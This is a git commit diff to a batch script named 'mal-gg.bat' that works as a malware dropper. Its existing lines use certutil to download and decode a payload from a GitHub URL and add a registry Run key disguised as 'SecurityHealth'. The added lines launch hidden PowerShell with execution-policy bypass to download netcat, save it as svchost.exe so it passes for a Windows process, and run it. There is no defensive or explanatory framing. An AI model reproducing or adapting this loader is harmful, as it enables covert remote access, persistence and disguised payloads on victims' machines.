f80b1ca5e501359398ff6c6f171b08285d329e0a
inwestallis <inwestallis@gmail.com>
2020-06-05 23:01:29 +0300

    Update mal-gg.bat

--- mal-gg.bat
+++ mal-gg.bat
@@ -2,4 +2,8 @@ certutil -urlcache -split -f https://raw.githubusercontent.com/inwestallis/first
 certutil -decode %Temp%\exit.b %Temp%\exit
 expand %Temp%\exit %Temp%\gg.lnk
 reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d notepad.exe /f
+
+powershell.exe -windowstyle hidden -ep Bypass -nop -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/inwestallis/first_repository/blob/master/nc64.exe','%Temp%\svchost.exe'); Start-Process '%Temp%\svchost.exe'"
+
+
 start %Temp%\gg.lnk
